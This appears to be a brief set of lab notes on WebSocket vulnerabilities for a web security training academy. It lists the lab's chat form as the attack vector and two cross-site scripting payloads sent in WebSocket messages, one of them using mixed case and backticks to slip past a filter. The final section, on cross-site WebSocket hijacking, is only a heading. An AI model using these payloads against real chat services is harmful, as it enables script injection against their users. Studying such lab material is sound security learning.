# WebSocket Vulnerabilities

### Manipulating WebSocket messages to exploit vulnerabilities
* Attack Vector
```html
<form id="chatForm" action="wss://ac2c1f411fac5042c0e80df200df001b.web-security-academy.net/chat" encode="true">
```
* Payload
```json
{"message" : "<img src=1 onerror='alert(1)'>"}
```

### Manipulating the WebSocket handshake to exploit vulnerabilities
* Attack Vector
```html
<form id="chatForm" action="wss://ac2c1f411fac5042c0e80df200df001b.web-security-academy.net/chat" encode="true">
```
* Payload
```json
{"message" : "<img src=1 oNeRrOr=alert`1`>"}
```

### Cross-site WebSocket hijacking

